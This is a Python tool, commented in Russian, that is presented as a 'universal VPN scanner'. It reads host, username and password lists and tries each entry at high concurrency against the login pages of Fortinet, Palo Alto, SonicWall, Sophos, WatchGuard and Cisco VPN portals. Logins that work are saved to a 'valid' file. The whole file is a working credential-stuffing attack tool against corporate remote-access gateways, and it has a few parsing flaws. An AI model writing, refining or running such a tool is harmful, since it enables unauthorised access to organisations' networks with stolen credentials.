#!/usr/bin/env python3
"""
Улучшенный универсальный VPN сканер с поддержкой различных типов VPN
Рефакторинг для улучшения производительности, безопасности и поддерживаемости
"""

import os
import sys
import json
import time
import random
import asyncio
import aiohttp
import aiofiles
import argparse
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Union, Any
from urllib.parse import quote_plus
from dataclasses import dataclass, field, asdict

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("vpn_scanner.log")
    ]
)
logger = logging.getLogger("vpn_scanner")

# Константы
SUPPORTED_VPN_TYPES = ["fortinet", "paloalto", "sonicwall", "sophos", "watchguard", "cisco"]

@dataclass
class ScannerStats:
    """Статистика сканирования"""
    goods: int = 0
    bads: int = 0
    errors: int = 0
    offline: int = 0
    ipblock: int = 0
    processed: int = 0
    rps: float = 0.0
    start_time: float = field(default_factory=time.time)
    
    def to_dict(self) -> Dict[str, Any]:
        """Преобразование в словарь для JSON"""
        result = asdict(self)
        result.pop('start_time')  # Не включаем время старта в JSON
        result['timestamp'] = int(time.time())
        return result
    
    def update_rps(self) -> None:
        """Обновление RPS"""
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            self.rps = self.processed / elapsed

@dataclass
class ScannerConfig:
    """Конфигурация сканера"""
    vpn_type: str
    creds_file: str
    output_file: str
    threads: int
    timeout: int
    verbose: bool
    insecure: bool
    stats_file: str
    
    @classmethod
    def from_args(cls, args: argparse.Namespace) -> 'ScannerConfig':
        """Создание конфигурации из аргументов командной строки"""
        creds_file = args.creds_file
        if not creds_file:
            creds_file = f"creds/{args.vpn_type}.txt"
        
        return cls(
            vpn_type=args.vpn_type,
            creds_file=creds_file,
            output_file=args.output,
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose,
            insecure=args.insecure,
            stats_file=f"stats_{os.getpid()}.json"
        )

class VPNScanner:
    """Основной класс сканера VPN"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.stats = ScannerStats()
        self.semaphore = asyncio.Semaphore(config.threads)
        self.credentials: List[str] = []
        self.success_indicators = self._get_success_indicators()
        
        # Проверка типа VPN
        if config.vpn_type not in SUPPORTED_VPN_TYPES:
            logger.error(f"Неподдерживаемый тип VPN: {config.vpn_type}")
            logger.info(f"Поддерживаемые типы: {', '.join(SUPPORTED_VPN_TYPES)}")
            sys.exit(1)
        
        # Проверка файла с учетными данными
        if not os.path.exists(config.creds_file):
            logger.error(f"Файл с учетными данными не найден: {config.creds_file}")
            sys.exit(1)
    
    def _get_success_indicators(self) -> Dict[str, List[str]]:
        """Получение индикаторов успешной аутентификации для разных типов VPN"""
        return {
            "fortinet": [
                "vpn/tunnel",
                "/remote/fortisslvpn",
                "tunnel_mode",
                "sslvpn_login",
                "forticlient_download",
                "portal.html",
                "welcome.html",
                "fgt_lang",
                "FortiGate",
                "sslvpn_portal",
                "logout",
                "dashboard",
                "web_access",
                "tunnel_access"
            ],
            "paloalto": [
                "Download Windows 64 bit GlobalProtect agent",
                "globalprotect/portal/css",
                "portal-userauthcookie",
                "GlobalProtect Portal",
                "gp-portal",
                "/global-protect/portal",
                "PanGlobalProtect",
                "clientDownload",
                "hip-report",
                "portal-config",
                "gateway-config",
                "logout",
                "welcome"
            ],
            "sonicwall": [
                "SonicWall",
                "NetExtender",
                "sslvpn",
                "portal.html",
                "welcome",
                "logout",
                "dashboard",
                "tunnel",
                "vpn-client"
            ],
            "sophos": [
                "Sophos",
                "userportal",
                "myaccount",
                "welcome",
                "logout",
                "portal",
                "dashboard",
                "vpn-client",
                "tunnel"
            ],
            "watchguard": [
                "WatchGuard",
                "Firebox",
                "portal",
                "welcome",
                "logout",
                "AuthPoint",
                "dashboard",
                "tunnel",
                "vpn-client"
            ],
            "cisco": [
                "SSL VPN Service",
                "webvpn_logout",
                "/+CSCOE+/",
                "webvpn_portal",
                "Cisco Systems VPN Client",
                "/+webvpn+/",
                "anyconnect",
                "ANYCONNECT",
                "remote_access"
            ]
        }
    
    async def load_credentials(self) -> None:
        """Загрузка учетных данных из файла"""
        try:
            async with aiofiles.open(self.config.creds_file, 'r') as f:
                async for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.credentials.append(line)
            
            logger.info(f"Загружено {len(self.credentials)} учетных данных")
        except Exception as e:
            logger.error(f"Ошибка при загрузке учетных данных: {e}")
            sys.exit(1)
    
    async def update_stats(self) -> None:
        """Периодическое обновление статистики"""
        while True:
            # Обновляем RPS
            self.stats.update_rps()
            
            # Записываем статистику в файл
            try:
                async with aiofiles.open(self.config.stats_file, 'w') as f:
                    await f.write(json.dumps(self.stats.to_dict()))
            except Exception as e:
                logger.error(f"Ошибка при записи статистики: {e}")
            
            # Выводим текущую статистику
            if self.config.verbose:
                elapsed = time.time() - self.stats.start_time
                logger.info(
                    f"G:{self.stats.goods} B:{self.stats.bads} E:{self.stats.errors} "
                    f"Off:{self.stats.offline} Blk:{self.stats.ipblock} | "
                    f"⚡{self.stats.rps:.1f}/s | ⏱️{int(elapsed)}s"
                )
            
            await asyncio.sleep(1)
    
    async def check_vpn(
        self, 
        session: aiohttp.ClientSession, 
        ip: str, 
        username: str, 
        password: str, 
        domain: str = "",
        verify_ssl: bool = True
    ) -> bool:
        """Проверка VPN учетных данных"""
        vpn_type = self.config.vpn_type
        
        try:
            if vpn_type == "fortinet":
                return await self.check_fortinet(session, ip, username, password, verify_ssl)
            elif vpn_type == "paloalto":
                return await self.check_paloalto(session, ip, username, password, verify_ssl)
            elif vpn_type == "sonicwall":
                return await self.check_sonicwall(session, ip, username, password, domain, verify_ssl)
            elif vpn_type == "sophos":
                return await self.check_sophos(session, ip, username, password, domain, verify_ssl)
            elif vpn_type == "watchguard":
                # Специальный формат для WatchGuard
                return await self.check_watchguard(session, ip, username, password, verify_ssl)
            elif vpn_type == "cisco":
                # Специальный формат для Cisco
                return await self.check_cisco(session, ip, username, password, domain, verify_ssl)
            else:
                raise ValueError(f"Неподдерживаемый тип VPN: {vpn_type}")
        except Exception as e:
            logger.error(f"Ошибка при проверке {vpn_type} VPN: {e}")
            raise
    
    async def check_fortinet(
        self, 
        session: aiohttp.ClientSession, 
        ip: str, 
        username: str, 
        password: str, 
        verify_ssl: bool = True
    ) -> bool:
        """Проверка Fortinet VPN"""
        if not ip.startswith("http"):
            ip = f"https://{ip}"
        
        if not ip.endswith("/remote/login"):
            if ip.endswith("/"):
                ip += "remote/login"
            else:
                ip += "/remote/login"
        
        data = {
            "username": username,
            "password": password
        }
        
        try:
            async with self.semaphore:
                async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                    text = await response.text()
                    
                    # Проверка на успешную аутентификацию
                    if response.status == 200:
                        for indicator in self.success_indicators["fortinet"]:
                            if indicator in text:
                                return True
                    
                    # Проверка на редирект
                    if response.status in (301, 302):
                        location = response.headers.get("Location", "")
                        if any(x in location for x in ["portal", "tunnel", "sslvpn", "welcome", "dashboard"]):
                            return True
                    
                    return False
        except asyncio.TimeoutError:
            raise TimeoutError("Connection timeout")
        except Exception as e:
            raise Exception(f"Error: {str(e)}")
    
    async def check_paloalto(
        self, 
        session: aiohttp.ClientSession, 
        ip: str, 
        username: str, 
        password: str, 
        verify_ssl: bool = True
    ) -> bool:
        """Проверка PaloAlto GlobalProtect VPN"""
        if not ip.startswith("http"):
            ip = f"https://{ip}"
        
        if not ip.endswith("/global-protect/login.esp"):
            if ip.endswith("/"):
                ip += "global-protect/login.esp"
            else:
                ip += "/global-protect/login.esp"
        
        data = {
            "prot": "https%",
            "server": ip.split("//")[1].split("/")[0],
            "inputStr": "",
            "action": "getsoftware",
            "user": username,
            "passwd": password,
            "ok": "Log In"
        }
        
        try:
            async with self.semaphore:
                async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                    text = await response.text()
                    
                    # Проверка на успешную аутентификацию
                    if response.status == 200:
                        for indicator in self.success_indicators["paloalto"]:
                            if indicator in text:
                                return True
                    
                    return False
        except asyncio.TimeoutError:
            raise TimeoutError("Connection timeout")
        except Exception as e:
            raise Exception(f"Error: {str(e)}")
    
    async def check_sonicwall(
        self, 
        session: aiohttp.ClientSession, 
        ip: str, 
        username: str, 
        password: str, 
        domain: str = "",
        verify_ssl: bool = True
    ) -> bool:
        """Проверка SonicWall VPN"""
        if not ip.startswith("http"):
            ip = f"https://{ip}"
        
        if not ip.endswith("/auth.html"):
            if ip.endswith("/"):
                ip += "auth.html"
            else:
                ip += "/auth.html"
        
        data = {
            "username": username,
            "password": password,
            "domain": domain,
            "login": "Login"
        }
        
        try:
            async with self.semaphore:
                async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                    text = await response.text()
                    
                    # Проверка на успешную аутентификацию
                    if response.status == 200:
                        for indicator in self.success_indicators["sonicwall"]:
                            if indicator in text:
                                return True
                    
                    return False
        except asyncio.TimeoutError:
            raise TimeoutError("Connection timeout")
        except Exception as e:
            raise Exception(f"Error: {str(e)}")
    
    async def check_sophos(
        self, 
        session: aiohttp.ClientSession, 
        ip: str, 
        username: str, 
        password: str, 
        domain: str = "",
        verify_ssl: bool = True
    ) -> bool:
        """Проверка Sophos VPN"""
        if not ip.startswith("http"):
            ip = f"https://{ip}"
        
        if not ip.endswith("/userportal/webpages/myaccount/login.jsp"):
            if ip.endswith("/"):
                ip += "userportal/webpages/myaccount/login.jsp"
            else:
                ip += "/userportal/webpages/myaccount/login.jsp"
        
        data = {
            "username": username,
            "password": password,
            "domain": domain,
            "loginBtn": "Login"
        }
        
        try:
            async with self.semaphore:
                async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                    text = await response.text()
                    
                    # Проверка на успешную аутентификацию
                    if response.status == 200:
                        for indicator in self.success_indicators["sophos"]:
                            if indicator in text:
                                return True
                    
                    return False
        except asyncio.TimeoutError:
            raise TimeoutError("Connection timeout")
        except Exception as e:
            raise Exception(f"Error: {str(e)}")
    
    async def check_watchguard(
        self, 
        session: aiohttp.ClientSession, 
        ip: str, 
        username: str, 
        password: str, 
        verify_ssl: bool = True
    ) -> bool:
        """Проверка WatchGuard VPN"""
        # Формат WatchGuard: https://ip:port:Firebox-DB:domain:user:pass
        parts = ip.split(":")
        if len(parts) < 6:
            raise ValueError("Invalid WatchGuard format")
        
        ip_port = parts[0] + ":" + parts[1] + ":" + parts[2]
        auth_type = parts[3]
        domain = parts[4]
        username = parts[5]
        password = parts[6] if len(parts) > 6 else password
        
        if not ip_port.startswith("http"):
            ip_port = f"https://{ip_port}"
        
        if not ip_port.endswith("/auth.fcc"):
            if ip_port.endswith("/"):
                ip_port += "auth.fcc"
            else:
                ip_port += "/auth.fcc"
        
        data = {
            "domain": domain,
            "username": username,
            "password": password,
            "authType": auth_type,
            "login": "Login"
        }
        
        try:
            async with self.semaphore:
                async with session.post(ip_port, data=data, ssl=False if not verify_ssl else None) as response:
                    text = await response.text()
                    
                    # Проверка на успешную аутентификацию
                    if response.status == 200:
                        for indicator in self.success_indicators["watchguard"]:
                            if indicator in text:
                                return True
                    
                    return False
        except asyncio.TimeoutError:
            raise TimeoutError("Connection timeout")
        except Exception as e:
            raise Exception(f"Error: {str(e)}")
    
    async def check_cisco(
        self, 
        session: aiohttp.ClientSession, 
        ip: str, 
        username: str, 
        password: str, 
        group: str = "",
        verify_ssl: bool = True
    ) -> bool:
        """Проверка Cisco ASA VPN"""
        # Формат Cisco: https://ip:port:user:pass:group (group optional)
        parts = ip.split(":")
        if len(parts) < 4:
            raise ValueError("Invalid Cisco format")
        
        ip_port = parts[0] + ":" + parts[1]
        username = parts[2]
        password = parts[3]
        group = parts[4] if len(parts) > 4 else group
        
        if not ip_port.startswith("http"):
            ip_port = f"https://{ip_port}"
        
        if not ip_port.endswith("/+webvpn+/index.html"):
            if ip_port.endswith("/"):
                ip_port += "+webvpn+/index.html"
            else:
                ip_port += "/+webvpn+/index.html"
        
        data = {
            "username": username,
            "password": password,
            "group_list": group,
            "Login": "Logon"
        }
        
        try:
            async with self.semaphore:
                async with session.post(ip_port, data=data, ssl=False if not verify_ssl else None) as response:
                    text = await response.text()
                    
                    # Проверка на успешную аутентификацию
                    if response.status == 200:
                        for indicator in self.success_indicators["cisco"]:
                            if indicator in text:
                                return True
                    
                    return False
        except asyncio.TimeoutError:
            raise TimeoutError("Connection timeout")
        except Exception as e:
            raise Exception(f"Error: {str(e)}")
    
    async def process_credential(self, session: aiohttp.ClientSession, cred: str) -> None:
        """Обработка одной учетной записи"""
        parts = cred.split(";")
        
        try:
            verify_ssl = not self.config.insecure
            vpn_type = self.config.vpn_type
            
            if vpn_type in ["fortinet", "paloalto", "sonicwall", "sophos"]:
                if len(parts) < 3:
                    raise ValueError("Invalid credential format")
                
                ip, username, password = parts[0], parts[1], parts[2]
                domain = parts[3] if len(parts) > 3 else ""
                
                if vpn_type == "fortinet":
                    result = await self.check_fortinet(session, ip, username, password, verify_ssl)
                elif vpn_type == "paloalto":
                    result = await self.check_paloalto(session, ip, username, password, verify_ssl)
                elif vpn_type == "sonicwall":
                    result = await self.check_sonicwall(session, ip, username, password, domain, verify_ssl)
                elif vpn_type == "sophos":
                    result = await self.check_sophos(session, ip, username, password, domain, verify_ssl)
            elif vpn_type == "watchguard":
                # Специальный формат для WatchGuard
                result = await self.check_watchguard(session, cred, "", "", verify_ssl)
            elif vpn_type == "cisco":
                # Специальный формат для Cisco
                result = await self.check_cisco(session, cred, "", "", "", verify_ssl)
            else:
                raise ValueError(f"Unsupported VPN type: {vpn_type}")
            
            if result:
                self.stats.goods += 1
                async with aiofiles.open(self.config.output_file, "a") as f:
                    await f.write(f"{cred}\n")
                if self.config.verbose:
                    logger.info(f"✅ VALID: {cred}")
            else:
                self.stats.bads += 1
                if self.config.verbose:
                    logger.info(f"❌ INVALID: {cred}")
            
            self.stats.processed += 1
            
        except TimeoutError:
            self.stats.offline += 1
            self.stats.processed += 1
            if self.config.verbose:
                logger.warning(f"⏰ TIMEOUT: {cred}")
        
        except Exception as e:
            self.stats.errors += 1
            self.stats.processed += 1
            if self.config.verbose:
                logger.error(f"❌ ERROR: {cred} - {str(e)}")
    
    async def run(self) -> None:
        """Запуск сканера"""
        logger.info(f"🚀 Запуск сканера {self.config.vpn_type.upper()}")
        await self.load_credentials()
        logger.info(f"⚙️ Потоков: {self.config.threads}, Таймаут: {self.config.timeout}s")
        
        # Создаем HTTP сессию
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        conn = aiohttp.TCPConnector(limit=self.config.threads, ssl=False if self.config.insecure else None)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
            # Запускаем задачу обновления статистики
            stats_task = asyncio.create_task(self.update_stats())
            
            # Запускаем задачи проверки учетных данных
            tasks = []
            for cred in self.credentials:
                task = asyncio.create_task(self.process_credential(session, cred))
                tasks.append(task)
            
            # Ждем завершения всех задач
            await asyncio.gather(*tasks)
            
            # Отменяем задачу обновления статистики
            stats_task.cancel()
            try:
                await stats_task
            except asyncio.CancelledError:
                pass
        
        # Финальное обновление статистики
        self.stats.update_rps()
        async with aiofiles.open(self.config.stats_file, "w") as f:
            await f.write(json.dumps(self.stats.to_dict()))
        
        logger.info("✅ Сканирование завершено!")
        logger.info(
            f"📊 Результаты: G:{self.stats.goods} B:{self.stats.bads} E:{self.stats.errors} "
            f"Off:{self.stats.offline} Blk:{self.stats.ipblock}"
        )
        logger.info(f"💾 Валидные учетные данные сохранены в {self.config.output_file}")

def parse_arguments() -> argparse.Namespace:
    """Парсинг аргументов командной строки"""
    parser = argparse.ArgumentParser(description="Universal VPN Scanner")
    parser.add_argument("--vpn-type", required=True, help="Тип VPN (fortinet, paloalto, sonicwall, sophos, watchguard, cisco)")
    parser.add_argument("--creds-file", help="Файл с учетными данными")
    parser.add_argument("--output", default="valid.txt", help="Файл для сохранения валидных учетных данных")
    parser.add_argument("--threads", type=int, default=100, help="Количество потоков")
    parser.add_argument("--timeout", type=int, default=10, help="Таймаут в секундах")
    parser.add_argument("--verbose", action="store_true", help="Подробный вывод")
    parser.add_argument("--insecure", action="store_true", help="Не проверять SSL сертификаты")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"], help="Уровень логирования")
    return parser.parse_args()

async def main() -> None:
    """Основная функция"""
    args = parse_arguments()
    
    # Настройка уровня логирования
    logger.setLevel(getattr(logging, args.log_level))
    
    # Инициализация и запуск сканера
    config = ScannerConfig.from_args(args)
    scanner = VPNScanner(config)
    await scanner.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.warning("🛑 Сканирование прервано пользователем")
        sys.exit(1)
    except Exception as e:
        logger.critical(f"❌ Критическая ошибка: {e}")
        sys.exit(1)